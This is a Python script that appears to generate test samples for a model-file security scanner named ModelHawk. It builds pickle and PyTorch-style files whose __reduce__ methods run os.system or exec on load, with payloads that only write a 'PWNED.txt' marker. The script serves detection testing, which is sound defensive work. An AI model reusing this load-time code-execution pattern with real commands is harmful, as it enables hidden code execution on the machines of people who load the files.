#!/usr/bin/env python3
"""
make_samples.py - ModelHawk's offensive half.

Crafts intentionally-malicious (but HARMLESS) model files so you can watch the
scanner catch a real exploit chain end-to-end.

HOW THE ATTACK WORKS
    During unpickling, Python calls obj.__reduce__() and then *executes* the
    (callable, args) tuple it returns. So an object whose __reduce__ returns
    (os.system, ("...",)) runs that command the instant someone calls
    torch.load() / pickle.load() on the file.

    Building the file does NOT run the payload: pickle.dumps only *records* the
    (callable, args) tuple - it never invokes the callable. The payload fires
    only on load. ModelHawk detects it statically, without loading.

HARMLESS BY DESIGN
    Every payload here only writes a 'PWNED.txt' marker (or echoes text). There
    is no deletion, persistence, or network activity. Even so:

        DO NOT pickle.load() / torch.load() these files. Scan them:
            python modelhawk.py samples/
"""
import json
import os
import pickle
import struct
import zipfile
from collections import OrderedDict

MARKER = "PWNED.txt"
# These strings are inert DATA inside the pickle; they only run if a victim
# *loads* the file. They simply drop a marker so a demo is visible.
_OS_CMD = f"echo You just executed code hidden in an ML model. > {MARKER}"
_EXEC_CODE = f"open({MARKER!r}, 'a').write('PWNED via builtins.exec\\n')"


class _ShellPayload:
    """__reduce__ -> os.system(cmd).  os.system serializes as nt.system / posix.system."""

    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        import os as _os
        return (_os.system, (self.cmd,))


class _ExecPayload:
    """__reduce__ -> builtins.exec(code)."""

    def __init__(self, code):
        self.code = code

    def __reduce__(self):
        return (exec, (self.code,))


def _benign_state_dict():
    """A tiny fake model state_dict - only the benign 'collections.OrderedDict' global."""
    return OrderedDict([
        ("layer1.weight", [[0.1, 0.2], [0.3, 0.4]]),
        ("layer1.bias", [0.0, 0.0]),
        ("meta", {"arch": "demo-net", "params": 6}),
    ])


def _safetensors_bytes():
    """Minimal structurally-valid safetensors file: <u64 len><JSON header><data>."""
    header = {
        "weight": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]},
        "__metadata__": {"note": "ModelHawk safe-format demo"},
    }
    hb = json.dumps(header).encode("utf-8")
    return struct.pack("<Q", len(hb)) + hb + struct.pack("<f", 0.0)


def build_samples(out_dir):
    """Write the demo corpus into out_dir. Returns the list of file paths."""
    os.makedirs(out_dir, exist_ok=True)
    written = []

    def write(name, data):
        path = os.path.join(out_dir, name)
        with open(path, "wb") as f:
            f.write(data)
        written.append(path)
        return path

    # 1) Benign baseline (protocol 5).
    write("benign_state_dict.pkl", pickle.dumps(_benign_state_dict(), protocol=5))

    # 2) Malicious - emitted at BOTH protocol 2 (inline GLOBAL opcode) and
    #    protocol 5 (STACK_GLOBAL opcode), so the scanner's two independent
    #    detection paths are both exercised.
    for proto in (2, 5):
        write(f"malicious_os_system.p{proto}.pkl",
              pickle.dumps(_ShellPayload(_OS_CMD), protocol=proto))
        write(f"malicious_exec.p{proto}.pkl",
              pickle.dumps(_ExecPayload(_EXEC_CODE), protocol=proto))

    # 3) Malicious payload wrapped in a PyTorch-style zip (.pt): archive/data.pkl
    #    plus a fake version file and tensor blob, mimicking torch.save() layout.
    pt_path = os.path.join(out_dir, "malicious_pytorch_model.pt")
    payload = pickle.dumps(_ShellPayload(_OS_CMD), protocol=2)
    with zipfile.ZipFile(pt_path, "w") as z:
        z.writestr("archive/data.pkl", payload)
        z.writestr("archive/version", "3\n")
        z.writestr("archive/data/0", b"\x00\x00\x00\x00")
    written.append(pt_path)

    # 4) The safe modern format (no code path at all).
    write("safe_model.safetensors", _safetensors_bytes())

    return written


if __name__ == "__main__":
    import sys

    out = sys.argv[1] if len(sys.argv) > 1 else os.path.join(
        os.path.dirname(os.path.abspath(__file__)), "samples")
    files = build_samples(out)
    print(f"[+] wrote {len(files)} sample(s) to {out}")
    for f in files:
        print("    ", os.path.basename(f))
    print("\n[!] These contain a REAL (harmless) exploit chain. Do NOT load them - scan them:")
    print(f"    python modelhawk.py {out}")
